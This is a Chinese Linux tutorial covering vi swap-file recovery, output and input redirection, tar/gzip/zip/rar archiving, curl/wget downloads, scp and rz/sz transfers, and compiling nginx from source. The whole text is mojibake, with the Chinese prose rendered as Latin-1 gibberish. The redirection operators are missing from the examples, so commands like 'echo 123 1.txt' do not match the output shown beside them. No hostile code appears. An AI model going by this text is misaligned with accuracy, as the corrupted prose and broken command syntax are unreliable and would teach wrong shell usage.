viæ³¨æ„é—®é¢˜å’ŒåŸç†è¯´æ˜### viç¼–è¾‘å†…å®¹åŸç† ## æ³¨æ„ï¼Œå¦‚æœå†…å­˜ä¸­çš„æ•°æ®æ²¡æœ‰ä¿®æ”¹ï¼Œæ²¡ä»€ä¹ˆäº‹å„¿ï¼Œå¦‚æœä¿®æ”¹äº†ï¼Œå¹¶ä¸”ä¸å°å¿ƒæ–­å¼€è¿æ¥äº†ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ­£å¸¸é€€å‡ºviï¼Œæ¯”å¦‚æˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼š ## é‚£ä¹ˆè¿™ä¸ªéšè—æ–‡ä»¶ä¼šä¸€ç›´åœ¨ç¡¬ç›˜ä¸Šï¼Œå½“æˆ‘ä»¬å†æ¬¡viä¿®æ”¹jaden.txtçš„æ—¶å€™ï¼Œå°±ä¼šçœ‹åˆ°å¦‚ä¸‹æç¤ºä¿¡æ¯ï¼š ## è¿™æ˜¯æç¤ºä½ ï¼Œå·²ç»æœ‰è¿™ä¸ª .jaden.txt.swp æ–‡ä»¶äº†ã€‚ä½ çœ‹åˆ°è¿™ä¸ªæç¤ºä¿¡æ¯å°±è¦è€ƒè™‘ä¸€ä¸‹ï¼Œæ˜¯ä¸æ˜¯è‡ªå·±ä¹‹å‰ä¸å°å¿ƒæ²¡ä¿å­˜å°±æ‰çº¿äº†ï¼Œè¿˜æ˜¯è¯´æœ‰å…¶ä»–äººæ­£åœ¨ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœæ˜¯è‡ªå·±ä¹‹å‰æ²¡æœ‰ä¿å­˜ï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©åˆ é™¤è¿™ä¸ªéšè—çš„swpæ–‡ä»¶ï¼Œå†ç¼–è¾‘å°±æ²¡æœ‰è¿™ä¸ªæç¤ºäº†ï¼Œè¿™æ˜¯æœ€ç®€å•çš„æ–¹å¼ã€‚æˆ–è€…è¾“å…¥ vi -r jaden.txt ä¼šçœ‹åˆ°è‡ªå·±ä¹‹å‰ä¿å­˜çš„å†…å®¹ï¼Œé‡æ–° wq! ä¿å­˜ä¸€ä¸‹ï¼Œç„¶åå†åˆ é™¤ .jaden.txt.swp æ–‡ä»¶å³å¯ï¼Œè‡ªå·±ä¹‹å‰çš„ä¿®æ”¹ä¹Ÿå°±è¿˜åœ¨ã€‚##vimç¼–è¾‘çš„æ—¶å€™ä¼šæç¤ºå¦‚ä¸‹ ## å¦‚æœæ˜¯æœ‰å…¶ä»–äººåœ¨ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼Œä½ å°±è¾“å…¥Oï¼Œè¡¨ç¤ºåªè¯»æ¨¡å¼æ‰“å¼€ï¼ŒEæ˜¯ç›´æ¥ç¼–è¾‘ï¼ŒRæ˜¯æ¢å¤æ–‡ä»¶ï¼ŒQæ˜¯é€€å‡ºä¸ç¼–è¾‘äº†ï¼ŒAæ˜¯ä¸­æ­¢æ“ä½œã€‚å…¶å®è¿˜æœ‰ä¸ªDæŒ‡ä»¤ï¼Œç›´æ¥åˆ é™¤éšè—æ–‡ä»¶ã€‚ 1-6 ä¸ä¼šviæ€ä¹ˆåŠ## å¯ä»¥æŠŠæ–‡ä»¶æ‹·è´åˆ°ç‰©ç†æœºï¼Œé€šè¿‡ç‰©ç†æœºçš„è®°äº‹æœ¬æˆ–è€…nodepad++ç­‰ç¼–è¾‘å™¨ä¿®æ”¹ï¼Œä¿®æ”¹å®Œå»æ›¿æ¢åŸæ–‡ä»¶å³å¯ã€‚## æ¯”å¦‚xftpå°±å¯ä»¥å¸®æˆ‘ä»¬ä¸‹è½½æ–‡ä»¶ã€‚ä½†æ˜¯å¦‚æœä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªæ”¹åŠ¨ä¸€ç‚¹å†…å®¹ï¼Œå°±å¯ä»¥å­¦å­¦viï¼Œæ²¡å¿…è¦ä¸Šä¼ ä¸‹è½½æ–‡ä»¶æ¥æ“ä½œï¼Œè€—æ—¶ã€‚ 2.12.2 è¾“å…¥è¾“å‡ºé‡å®šå‘2-1 è¾“å‡ºé‡å®šå‘01â€“æ¸…ç©ºæ–‡ä»¶## è¾“å‡ºï¼š ## è¾“å‡ºé‡å®šå‘ï¼Œ å°†å‘½ä»¤æ‰§è¡Œç»“æœä¸è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œè¾“å‡ºåˆ°æ–‡ä»¶é‡Œï¼Œä¼šæ¸…ç©ºåŸæ–‡ä»¶ï¼Œæ‰€ä»¥è¾“å‡ºçš„æ—¶å€™ä¸€å®šè¦æ³¨æ„ï¼Œæ–‡ä»¶åç§°è¦çœ‹å¥½äº†ã€‚ [root@localhost ~]# head -20 services 2.txt [root@localhost ~]# cat 2.txt [root@localhost ~]# seq 100 1.txt [root@localhost ~]# echo 123 1.txt [root@localhost ~]# cat 1.txt 123 ## æ¸…ç©ºæ–‡ä»¶å†…å®¹ [root@localhost ~]# 1.txt [root@localhost ~]# cat 1.txt 2-2 è¾“å‡ºé‡å®šå‘02â€“è¿½åŠ ## è¾“å‡ºè¿½åŠ é‡å®šå‘ï¼Œä¸ä¼šæ¸…ç©ºåŸæ–‡ä»¶ [root@localhost ~]# echo aaaaa 2.txt [root@localhost ~]# cat 2.txt 2-3 æ ‡å‡†æ­£ç¡®â€“é”™è¯¯è¾“å‡ºé‡å®šå‘## å¦‚æœè¾“å‡ºæ–‡ä»¶è¿˜æ²¡æŒ‡å®šï¼Œåˆ™è‡ªåŠ¨åˆ›å»º[root@localhost ~]# cat jaden.txt 11.txt 22.txt # æŒ‡ä»¤æ­£ç¡®ä¼šå°†æ•°æ®ä¿å­˜åˆ°1.txtä¸­ 2-4 è¾“å…¥é‡å®šå‘## è¾“å…¥ï¼š ## è¾“å…¥é‡å®šå‘ [root@localhost ~]# cat jaden.txt 3.txt # å°†jaden.txtçš„æ•°æ®è¾“å…¥è¿‡æ¥å¹¶å†™å…¥3.txtä¸­ [root@localhost ~]# cat jaden.txt ## è¾“å…¥è¿½åŠ é‡å®šå‘(è¿™ä¸ªå°±ä¸æ¼”ç¤ºäº†ï¼Œé‡åˆ°äº†å†è¯´) # æ ‡å‡†è¾“å…¥0ï¼Œæ”¯æŒç”¨æˆ·ç›´æ¥è¾“å…¥å†…å®¹ [root@localhost ~]# cat 0 1 2 2222 0 ## è¾“å…¥0å°±é€€å‡º 1 2 2222 [root@localhost ~]# cat 0 22.txt ## ç»™å±å¹•è¾“å…¥ä¸€äº›å†…å®¹ï¼Œå¹¶ä¿å­˜åˆ°æ–‡ä»¶é‡Œ a b ddd 0 [root@localhost ~]# cat 22.txt a b ddd 2.13 Linux å‹é”™æ‰“åŒ…2.13.1 tarâ€”â€”ï¼ˆ.tar.gzç»“å°¾)1-1 tarå‹ç¼©å’Œè§£å‹ç¼©# å‹ç¼©æ–‡ä»¶æœ‰æ—¶å€™æˆ‘ä»¬ä¹Ÿå«åšå½’æ¡£æ–‡ä»¶ã€‚ä½†æ˜¯å½’æ¡£å’Œå‹ç¼©æœ‰ä¸€äº›åŒºåˆ«ï¼Œå½’æ¡£åªæ˜¯å°†å¤šä¸ªæ–‡ä»¶æ†ç»‘æˆä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰å‹ç¼©ï¼Œè€Œå‹ç¼©æ‰æ˜¯å°†å¤§å°å‹ç¼©çš„æ›´å°ã€‚#Linuxæœ€å¸¸ç”¨çš„å‹ç¼©å’Œè§£å‹æŒ‡ä»¤æ˜¯ï¼š## tarï¼šèƒ½å¤Ÿè§£å‹çš„æ–‡ä»¶æ ¼å¼æ˜¯xx.tar.gz ## å‹ç¼©ï¼štar -zcf å‹ç¼©åŒ…è·¯å¾„ ç›®æ ‡1 ç›®æ ‡2 ç›®æ ‡3 ... ## è§£å‹ï¼štar -zxf è§£å‹è·¯å¾„ ## ä¾‹å­1ï¼šå‹ç¼©å’Œè§£å‹æ–‡ä»¶ [root@localhost ~]# ls ## 123.txt 4.txt a.txt c.txt jaden.txt 1.txt anaconda-ks.cfg b.txt jaden.tar.gz services ## åˆ é™¤æ‰€æœ‰æ–‡ä»¶ [root@localhost ~]# rm -f * [root@localhost ~]# ls ## å¤åˆ¶æ–‡ä»¶ [root@localhost ~]# cp /etc/services . ## å‹é”™ [root@localhost ~]# tar -zcf jaden.tar.gz services #æŠŠservices æ–‡ä»¶å‹ç¼©æˆjaden.tar.gz [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 134K 3æœˆ 22 14:51 jaden.tar.gz -rw-r--r-- 1 root root 655K 3æœˆ 22 11:22 services [root@localhost ~]# rm -f services # åˆ é™¤åŸæ–‡ä»¶ä¹‹åå°±å†è§£å‹ [root@localhost ~]# tar -zxf jaden.tar.gz # è§£å‹æ–‡ä»¶ [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 134K 3æœˆ 22 14:51 jaden.tar.gz -rw-r--r-- 1 root root 655K 3æœˆ 22 11:22 services #çœ‹åˆ°å’Œæºæ–‡ä»¶ä¸€æ ·çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ–‡ä»¶å±æ€§ä¹Ÿä¸€æ ·ã€‚ ## åŒæ—¶å‹ç¼©å¥½å‡ ä¸ªæ–‡ä»¶ ## æŠŠ1.txt å’Œ aini ç›®å½•åˆ†åˆ«å‹ç¼©æˆkk.tar.hzå’Œjj.tar.gz tar -zcf kk.tar.jz jj.tar.gz 1.txt aini ## æŠŠ1.txt å’Œ jadenå‹ç¼©åˆ°/tmp/oo.tar.gz tar -zcf /tmp/oo.tar.gz 1.txt jaden 1-2 tarå½’æ¡£#å½’æ¡£ï¼Œä½†æ˜¯ä¸å‹ç¼© tar -cf [root@localhost ~]# cp /etc/services ./shike # å†æ‹·è´ä¸€ä¸ªservicesæ–‡ä»¶è¿‡æ¥ [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 13M 3æœˆ 22 14:58 2.tar.gz -rw-r--r-- 1 root root 134K 3æœˆ 22 14:56 jaden.tar.gz -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike [root@localhost ~]# tar -cf 3.tar.gz services shike #å½’æ¡£ï¼Œä½†æ˜¯ä¸å‹ç¼© [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 13M 3æœˆ 22 14:58 2.tar.gz -rw-r--r-- 1 root root 1.3M 3æœˆ 22 15:04 3.tar.gz #çœ‹å¤§å°å°±çŸ¥é“æ²¡æœ‰å‹ç¼©å¤§å°ã€‚ -rw-r--r-- 1 root root 134K 3æœˆ 22 14:56 jaden.tar.gz -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike 1-3 æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹[root@localhost ~]# tar -tf 3.tar.gz servicesshike## tarè¿™ä¸ªæŒ‡ä»¤çš„å‚æ•°å¯ä»¥ä¸åŠ ## tar tf 3.tar.gz## linuxç³»ç»Ÿä¸‹è§£å‹æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸åŒæ ¼å¼çš„å‹ç¼©åŒ…éœ€è¦ä½¿ç”¨ä¸åŒçš„å‘½ä»¤æ¥è§£å‹æˆ–è€…å‹ç¼©ã€‚ 2.13.2 gzipâ€”-ï¼ˆ.gzç»“å°¾)#æ‰“åŒ…å’Œå‹ç¼© gzip #å‹ç¼©æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤åŸæ–‡ä»¶ï¼Œå’Œtarä¸åŒï¼Œtarä¼šç•™ç€åŸæ–‡ä»¶ [root@localhost ~]# gzip services [root@localhost ~]# ls -lh æ€»ç”¨é‡ 15M -rw-r--r-- 1 root root 133K 3æœˆ 22 14:55 services.gz -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike # è§£å‹ï¼Œä¼šè‡ªåŠ¨åˆ é™¤åŸå‹ç¼©åŒ… [root@localhost ~]# gzip -d services.gz [root@localhost ~]# ls -lh æ€»ç”¨é‡ 16M -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike #å‹ç¼©å¤šä¸ªæ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶äº§ç”Ÿä¸€ä¸ªå•ç‹¬çš„å‹ç¼©åŒ… [root@localhost ~]# gzip services shike [root@localhost ~]# ls -lh æ€»ç”¨é‡ 15M -rw-r--r-- 1 root root 133K 3æœˆ 22 14:55 services.gz -rw-r--r-- 1 root root 133K 3æœˆ 22 15:04 shike.gz #è§£å‹ç¼© [root@localhost ~]# gzip -d services.gz shike.gz [root@localhost ~]# ls -lh æ€»ç”¨é‡ 16M -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike ## gzipå…¶å®æ„Ÿè§‰å¹¶ä¸å¤ªå¥½ç”¨ï¼Œä½†æ˜¯å·¥ä½œä¸­æˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°gzipçš„å‹ç¼©åŒ…ã€‚ 2.13.3 zip ï¼ˆ.zipç»“å°¾ï¼‰#å‹ç¼© zip ä¾‹å­1ï¼š [root@localhost ~]# zip -r 1.zip services shike #ä¼šä¿ç•™åŸæ–‡ä»¶ adding: services (deflated 80%) adding: shike (deflated 80%) [root@localhost ~]# ls -lh æ€»ç”¨é‡ 16M -rw-r--r-- 1 root root 267K 3æœˆ 22 15:25 1.zip -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike #è§£å‹ unzip ä¾‹å­1ï¼š # è§£å‹ä¹‹å‰å…ˆæŠŠåŸæ–‡ä»¶åˆ æ‰ï¼Œä»¥å…å†²çª [root@localhost ~]# unzip 1.zip [root@localhost ~]# ls -lh æ€»ç”¨é‡ 16M -rw-r--r-- 1 root root 267K 3æœˆ 22 15:25 1.zip -rw-r--r-- 1 root root 655K 3æœˆ 22 14:55 services -rw-r--r-- 1 root root 655K 3æœˆ 22 15:04 shike 2.13.4 rarè§£å‹## windowsä¸Šå¸¸è§çš„raræ ¼å¼çš„å‹ç¼©åŒ…ï¼Œåœ¨linuxä¸Šå…¶å®æ¯”è¾ƒéš¾è§£å‹ï¼Œéœ€è¦æˆ‘ä»¬å®‰è£…ä¸“ä¸šçš„å·¥å…·ï¼š #è§£å‹raråŒ… #éœ€è¦å®‰è£…è½¯ä»¶ yum install epel-release -y yum install unar -y #å†è¿›è¡Œè§£å‹ unar -o è§£å‹è·¯å¾„ è¢«è§£å‹æ–‡ä»¶è·¯å¾„ ## ä¾‹å¦‚ï¼š unar -o /opt 456.rar ## å¦‚ä¸‹[root@localhost ~]# ls1.zip 2.tar.gz 3.tar.gz jaden.rar jaden.tar services shike[root@localhost ~]# mkdir xx[root@localhost ~]# unar -o ./xx jaden.rar ## æŠŠjaden.rar è§£å‹åˆ°./xxç›®å½•ä¸‹jaden.rar: RAR 5 jaden.txt (49 B)... OK.Successfully extracted to ./xx/jaden.txt.[root@localhost ~]# ls xx/jaden.txt## å°½é‡ä¸è¦ç»™linuxå‘é€rarçš„å‹ç¼©åŒ…ã€‚å…¨ä¸–ç•Œé€šç”¨çš„æ˜¯zipæ ¼å¼çš„å‹ç¼©åŒ…ã€‚å¥½ï¼Œå…³äºå‹ç¼©å’Œè§£å‹æˆ‘ä»¬å°±å…ˆè¯´è¿™ä¹ˆå¤šã€‚ 2.14 æ–‡ä»¶ä¼ è¾“åŠç½‘ç»œæ–‡ä»¶ä¸‹è½½## å’ŒLinuxè¿›è¡Œæ–‡ä»¶ä¼ è¾“ï¼Œå¤§æ¦‚æœ‰ä¸‹é¢è¿™ä¹ˆå‡ ç§æƒ…å†µï¼Œçœ‹å›¾ 2.14.1 ç½‘ç«™ä¸‹è½½æ–‡ä»¶#ä¸‹è½½æ–‡ä»¶ ## curl #ä¸‹è½½æ–‡ä»¶ curl -o æœ¬åœ°å­˜æ”¾è·¯å¾„ æ–‡ä»¶ç½‘å€ ä¾‹å¦‚ï¼šæœ‰äº›ç½‘ç«™åœ¨åå°å¯èƒ½ç¦äº†curlä¸‹è½½ï¼Œå¯¼è‡´ä¸‹è½½ä¸ä¸‹æ¥ curl -o 123.zip https://github.com/nmap/nmap/archive/refs/heads/master.zip ## wget æ–‡ä»¶ç½‘å€ # éœ€è¦è‡ªè¡Œå®‰è£…ä¸€ä¸‹æ‰æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œcurlæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„ yum install -y wget [root@localhost ~]# wget https://github.com/nmap/nmap/archive/refs/heads/master.zip # wgetæ¯”curlæ–¹ä¾¿ï¼Œæœ€èµ·ç ä¸éœ€è¦æŒ‡å®šæ–‡ä»¶åï¼Œcurlå¦‚æœä¸æŒ‡å®šæ–‡ä»¶åè·¯å¾„çš„è¯ä¼šå°†æ–‡ä»¶å†…å®¹æ‰“å°åœ¨å±å¹•ä¸Š #ä½¿ç”¨curlå’Œwgetçš„å‰ææ˜¯è¦æœ‰ç½‘#æ£€æŸ¥ç½‘ç»œç•…é€š## ping ä¾‹å­1ï¼šping 223.5.5.5 #å¦‚æœç½‘ä¸é€šï¼Œé‡å¯ç½‘ç»œæœåŠ¡ ystemctl restart network #æŸ¥çœ‹æ–‡ä»¶ç±»å‹ file ä¾‹å­1ï¼š file 123.zip 2.14.2 scpä¼ è¾“# æˆ‘ä»¬å‡†å¤‡ä¸¤å°linuxè™šæ‹Ÿæœºæ¥ç©ï¼š#ä¸»è¦ç”¨äºlinuxå’ŒlinuxæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ–‡ä»¶ï¼Œscpè¦æ±‚æ¥å—æ•°æ®çš„ä¸€æ–¹è¦å¼€å¯äº†sshæœåŠ¡ç«¯æ‰è¡Œï¼Œå¦‚æœä½ ç”µè„‘æ˜¯è‹¹æœç”µè„‘macç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨scpæ¥ä¼ è¾“ã€‚windowså¾€linuxä¸Šé¢å‘é€æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨scpï¼Œä½†æ˜¯åªèƒ½å•å‘çš„ï¼Œå› ä¸ºwindowsä¸Šæ²¡æœ‰sshæœåŠ¡ç«¯ã€‚#æŠŠæœ¬åœ°æ–‡ä»¶æ¨é€åˆ°è¿œç¨‹æœåŠ¡ç«¯ # æ ¼å¼ï¼š scp æœ¬åœ°æ–‡ä»¶è·¯å¾„ è¿œç¨‹ä¸»æœºç”¨æˆ·@è¿œç¨‹ä¸»æœºipåœ°å€:è¿œç¨‹ä¸»æœºæŸä¸ªç›®å½• scp typora-setup-x64.exe root@10.0.0.128:/tmp #æŠŠè¿œç«¯æœåŠ¡æ–‡ä»¶æ‹‰å–åˆ°æœ¬åœ° # æ ¼å¼ï¼šscp è¿œç¨‹ä¸»æœºç”¨æˆ·@è¿œç¨‹ä¸»æœºipåœ°å€:è¿œç¨‹ä¸»æœºæŸä¸ªæ–‡ä»¶è·¯å¾„ æœ¬åœ°è·¯å¾„ scp root@10.0.0.128:/tmp/typora-setup-x64.exe .## win10åŠä»¥ä¸Šç‰ˆæœ¬æ˜¯æœ‰scpæŒ‡ä»¤çš„ï¼Œwinå’Œwinä¹‹é—´æ˜¯ä¸èƒ½ä½¿ç”¨scpäº’ç›¸ä¼ æ–‡ä»¶çš„ï¼Œå› ä¸ºwindowsä¸Šé»˜è®¤æ˜¯æ²¡æœ‰sshçš„æœåŠ¡ç«¯çš„ï¼Œåªæœ‰å®¢æˆ·ç«¯ã€‚# windowsä½¿ç”¨scpç»™linuxä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åä¸­ä¸å…è®¸å‡ºç°ä¸­æ–‡å’Œç©ºæ ¼ã€‚# æ ¼å¼å’Œä¸Šé¢ä¸€æ ·scp typora-setup-x64.exe root@10.0.0.128:/tmp ## macç³»ç»Ÿä¹Ÿæ˜¯ç›´æ¥å¯ä»¥ä½¿ç”¨scpæ¥ç»™linuxä¸Šä¼ æ–‡ä»¶çš„ã€‚ 2.14.3 rzå’Œsz(win â€”â€”â€”â€”â€”â€” linux)#ä¸Šä¼ å’Œä¸‹è½½ rz #ä¸Šä¼  sz #ä¸‹è½½#å…ˆå®‰è£…lrzszè½¯ä»¶åŒ… yum install lrzsz -y#ä¸Šä¼ çš„ä¾‹å­ ## å¦‚æœä½¿ç”¨xshellï¼Œç›´æ¥é¼ æ ‡æ‹–æ‹½ï¼Œæˆ–è€…æ‰§è¡Œrz -Eé€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶#ä¸‹è½½çš„ä¾‹å­ sz /root/test3.tar.gz 2.14.4 xftpä¸Šä¼ ä¸‹è½½## è¿™ä¸ªæˆ‘ä»¬éƒ½ä¼šç©äº†ï¼Œå°±ä¸æ¼”ç¤ºäº†ã€‚ 2.15 è½¯ä»¶å®‰è£…## å­¦ä¹ è¿™ä¸ªè¯¾ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå°†è™šæ‹Ÿæœºæ¢å¤ä¸€ä¸‹å¿«ç…§ã€‚## ä¸ç®¡æ˜¯ä»€ä¹ˆç³»ç»Ÿï¼Œå®‰è£…è½¯ä»¶éƒ½æœ‰å¤šç§æ–¹å¼ã€‚æ¯”å¦‚å‰é¢è®²è§£windowsçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿè¯´åˆ°äº†å‡ ç§å®‰è£…æ–¹å¼ï¼Œlinuxä¹Ÿä¸åˆ—å¤–ï¼Œä¹Ÿæœ‰å¤šç§è½¯ä»¶å®‰è£…æ–¹å¼ã€‚è€Œlinuxå®‰è£…è½¯ä»¶å…¶å®æ˜¯æ¯”windowsè¦å¤æ‚ä¸€äº›çš„ï¼ŒåŸå› å¦‚ä¸‹ ## Linuxè½¯ä»¶å®‰è£…å¤æ‚ä¸»è¦å°±å¤æ‚åœ¨è½¯ä»¶çš„ä¾èµ–æ–‡ä»¶ä¸Šäº†ï¼Œä¹Ÿå«åšä¾èµ–åŒ…ï¼Œè¦æƒ³å®‰è£…æŸä¸ªè½¯ä»¶ï¼Œå…ˆè¦å»å®‰è£…å®ƒçš„ä¾èµ–åŒ…ã€‚ 2.15.1 ç¼–è¯‘å®‰è£…## æˆ‘ä»¬æœ‰æ—¶å€™å®‰è£…è½¯ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çš„æ˜¯è½¯ä»¶æºä»£ç ï¼Œä¸èƒ½ç›´æ¥è¿è¡Œï¼Œéœ€è¦ç¼–è¯‘ä¹‹åæ‰èƒ½è¿è¡Œï¼Œæºä»£ç --ç¼–è¯‘--äºŒè¿›åˆ¶æœºå™¨ç ï¼Œæ‰èƒ½è¿è¡Œã€‚æ¯”å¦‚windowsçš„æŸäº›è½¯ä»¶æ˜¯ä»æºä»£ç ç¼–è¯‘æ‰“åŒ…ä¹‹åæ‰ç”Ÿæˆexeç¨‹åºï¼Œå¹³å¸¸æˆ‘ä»¬æ¥è§¦ä¸åˆ°ï¼Œå¤§å®¶å®‰è£…çš„è½¯ä»¶éƒ½æ˜¯åŸºæœ¬åˆ«äººç¼–è¯‘å¥½çš„ã€‚è€Œlinuxä¸‹ç¼–è¯‘ä¹‹åä¼šç”ŸæˆäºŒè¿›åˆ¶çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸æ˜¯exeç¨‹åºæ˜‚ï¼Œå’Œwindowsä¸åŒï¼Œè¿™ç§æ–‡ä»¶æ²¡æœ‰åç¼€åã€‚å…¶å®linuxç³»ç»Ÿä¸‹å°±æ²¡æœ‰æ–‡ä»¶åç¼€åè¿™ä¸ªæ¦‚å¿µï¼Œå¥½å¤šåç¼€åéƒ½æ˜¯æˆ‘ä»¬äººå·¥è‡ªå·±åŠ ä¸Šå»çš„ï¼Œä¸ºäº†è®©è‡ªå·±çŸ¥é“æ–‡ä»¶æ˜¯å¹²å˜›çš„ï¼Œä¸»è¦æ˜¯ç»™æˆ‘ä»¬è‡ªå·±çœ‹çš„ï¼ŒåŒºåˆ†ä½œç”¨ã€‚## æˆ‘ä»¬ç”¨ä¸€ä¸ªç½‘ç«™æœåŠ¡è½¯ä»¶æ¥ç©ä¸€ç©è¯•è¯•ï¼š1.ä¸‹è½½æºç åŒ… cd /opt/ rm -fr * curl -o nginx.tar.gz http://nginx.org/download/nginx-1.20.1.tar.gz 2.ç¼–è¯‘å®‰è£… tar xf nginx.tar.gz cd nginx-1.20.1/ [root@localhost nginx-1.20.1]# ls auto CHANGES CHANGES.ru conf configure contrib html LICENSE man README src# 1.é…ç½®ç¼–è¯‘å‚æ•° # è¿™ä¸ªè½¯ä»¶ç»™æˆ‘ä»¬æä¾›äº†å¾ˆå¤šåŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­å¯ä»¥è‡ªå·±é€‰æ‹©å“ªäº›åŠŸèƒ½è¦ï¼Œå“ªäº›åŠŸèƒ½ä¸è¦ï¼Œæ‰€æœ‰åŠŸèƒ½éƒ½è¦å°±æ˜¯å®Œæ•´ç‰ˆï¼Œå¥½å¤šåŠŸèƒ½éƒ½ ä¸è¦å°±æˆäº†ç²¾ç®€ç‰ˆï¼Œæ¯”å¦‚qqç²¾ç®€ç‰ˆï¼Œä¸çŸ¥é“å¤§å®¶å¬æ²¡å¬è¿‡ã€‚ ./configure --prefix=/usr/local/nginx --without-pcre --without-http_rewrite_module --without-http_gzip_module #æˆ‘è¿™é‡Œç¦æ‰äº†ä¸€äº›åŠŸèƒ½ï¼Œä»¥ä¸ºè¿™äº›åŠŸèƒ½éƒ½éœ€è¦å¥½å¤šä¾èµ–åŒ…ï¼Œå¤§å®¶è¿˜ä¸çŸ¥é“ä¾èµ–åŒ…æ˜¯æ€ä¹ˆå›äº‹å„¿ï¼Œæ‰€ä»¥æˆ‘å°±æš‚æ—¶å…ˆåˆ é™¤äº†ã€‚--withoutå°±æ˜¯å»æ‰çš„æ„æ€ã€‚--prefix=/usr/local/nginxæ˜¯æŒ‡å®šè½¯ä»¶çš„å®‰è£…ç›®å½•ï¼Œç›®å½•ä¸å­˜åœ¨çš„è¯ä¼šè‡ªåŠ¨åˆ›å»ºã€‚./æ˜¯ç”¨ç›¸å¯¹è·¯å¾„æ¥æ‰§è¡Œè¿™ä¸ªconfigureæ–‡ä»¶ï¼Œç”¨ç»å¯¹è·¯å¾„ä¹Ÿå¯ä»¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚è¿™ä¸ªæŒ‡ä»¤æ‰§è¡Œä¹‹åï¼Œä¼šè‡ªåŠ¨æ£€æŸ¥å„ç§ä¾èµ–ç¯å¢ƒæ˜¯å¦æ»¡è¶³è½¯ä»¶è¿è¡Œçš„è¦æ±‚ï¼Œæ£€æŸ¥é€šè¿‡ä¹‹åä¼šç”Ÿæˆä¸€ä¸ªå«åšMakefileçš„æ–‡ä»¶ã€‚ [root@localhost nginx-1.20.1]# ls auto CHANGES.ru configure html Makefile objs src CHANGES conf contrib LICENSE man README #å¤šäº†ä¸¤ä¸ªæ–‡ä»¶Makefileå’Œobjsï¼Œåˆšæ‰çš„æŒ‡ä»¤ä¸»è¦æ˜¯ä¸ºäº†ç”ŸæˆMakefile # 2.ç¼–è¯‘ make #makeä¼šæ‰¾å½“å‰ç›®å½•ä¸­çš„Makefileæ–‡ä»¶æ¥è¿›è¡Œç¼–è¯‘ï¼Œè¿™ä¸ªç¼–è¯‘è¿‡ç¨‹ä¸€èˆ¬æ˜¯æ¯”è¾ƒé•¿çš„ã€‚åˆ°åº•å¤šé•¿æ—¶é—´å‘¢ï¼Ÿ1ã€çœ‹CPUæ€§èƒ½ 2ã€è½¯ä»¶åŠŸèƒ½å¤æ‚åº¦ [root@localhost nginx-1.20.1]# ls auto CHANGES.ru configure html Makefile objs src CHANGES conf contrib LICENSE man README # ç¼–è¯‘ä¹‹åçœ‹ä¸Šå»ç›®å½•ç»“æ„å’Œä¹‹å‰ä¸€æ ·ï¼Œä½†æ˜¯objsç›®å½•é‡Œé¢å…¶å®å¤šäº†å¥½å¤šä¸œè¥¿ã€‚ [root@localhost nginx-1.20.1]# ls objs/ autoconf.err nginx ngx_auto_config.h ngx_modules.c src Makefile nginx.8 ngx_auto_headers.h ngx_modules.o # å…¶ä¸­nginxæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œçš„å‘½ä»¤æ–‡ä»¶ã€‚å®ƒæ˜¯å¯æ‰§è¡Œçš„ç¨‹åºäº†ï¼Œæ¯”å¦‚æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å®ƒçš„ç‰ˆæœ¬ [root@localhost nginx-1.20.1]# ./objs/nginx -v nginx version: nginx/1.20.1 # åˆ°è¿™é‡Œåªæ˜¯ç¼–è¯‘å®Œäº†ï¼Œè¿˜éœ€è¦å®‰è£…ï¼Œå…¶å®å®‰è£…å°±æ˜¯å°†è¿™ä¸ªç¨‹åºçš„æŸäº›æ–‡ä»¶æ”¾åˆ°å¯¹åº”çš„ç›®å½•ä¸­å»ã€‚å…¶å®æˆ‘ä»¬åœ¨ä¸Šé¢çš„ç¼–è¯‘å‚æ•°ä¸­å·²ç»æŒ‡å®š 